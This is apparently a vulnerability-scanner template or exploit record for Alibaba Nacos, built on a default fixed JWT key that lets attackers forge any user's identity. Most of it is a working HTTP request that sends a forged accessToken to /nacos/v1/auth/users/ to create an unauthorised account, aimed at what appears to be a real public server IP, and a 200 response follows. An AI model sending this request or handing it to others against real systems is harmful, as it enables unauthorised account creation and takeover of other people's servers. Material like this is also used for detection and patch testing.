info.name: Alibaba Nacos - Unauthorized Account Creation
info.author: SleepingBag945
info.description: Nacos uses a fixed JWT token key to authenticate users in the default configuration. Since Nacos is an open source project, the key is publicly known, so unauthorized attackers can use this fixed key to forge any user identity Log in to Nacos to manage and operate background interface functions.

req_resp.req:
POST /nacos/v1/auth/users/?username=666&password=123456666&accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g HTTP/1.1
HOST: 8.130.109.131
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Host: 8.130.109.131:8848
Content-Length: 0
req_resp.resp:
HTTP/1.1 200
Content-Type: application/json;charset=UTF-8
